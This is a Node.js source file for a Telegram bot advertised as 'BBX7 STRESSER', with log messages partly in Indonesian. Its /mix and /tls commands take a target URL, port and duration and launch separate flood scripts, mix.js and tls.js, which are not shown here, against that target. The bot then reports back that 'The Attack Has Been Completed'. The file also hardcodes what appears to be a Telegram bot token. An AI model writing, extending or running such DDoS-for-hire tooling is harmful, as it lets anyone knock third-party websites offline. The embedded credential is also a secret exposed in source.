const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');

const bot = new TelegramBot('7332203821:AAHKspsd8XQVFyOEtALICQZKVlqSHdONGpE', { polling: true });

function getCurrentTime() {
  const now = new Date();
  const timeString = now.toLocaleTimeString();
  const dateString = now.toLocaleDateString();
  const dayString = now.toLocaleDateString('en-US', { weekday: 'long' });
  return `${timeString} ${dateString} ${dayString}`;
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = "════════════════════\r\nWELCOME TO BBX7 STRESSER\r\n════════════════════\r\nMethods:\r\n/mix URL PORT TIME\r\n/tls URL PORT TIME\r\n\r\nBot By : @PakanWedus";
  bot.sendMessage(chatId, message);
});

bot.onText(/\/mix (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username;
  const time = getCurrentTime();
  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /mix`);

  const args = match[1].split(' ');
  const url = args[0];
  const req = args[2];
  const timeArg = args[1];

  const browserProcess = spawn('node', ['mix.js', url, req, timeArg, 14,], { cwd: __dirname });

  browserProcess.stderr.on('data', (data) => {
    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
    bot.sendMessage(chatId, `stderr: ${data}`);
  });

  browserProcess.on('close', (code) => {
    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
    bot.sendMessage(chatId, `The Attack Has Been Completed ${code}`);
  });
});
//new code
bot.onText(/\/tls (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username;
  const time = getCurrentTime();
  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /tls`);

  const args = match[1].split(' ');
  const url = args[0];
  const req = args[2];
  const timeArg = args[1];

  const browserProcess = spawn('node', ['tls.js', url, req, timeArg, 14,], { cwd: __dirname });

  browserProcess.stderr.on('data', (data) => {
    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
    bot.sendMessage(chatId, `stderr: ${data}`);
  });

  browserProcess.on('close', (code) => {
    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
    bot.sendMessage(chatId, `The Attack Has Been Completed ${code}`);
  });
});
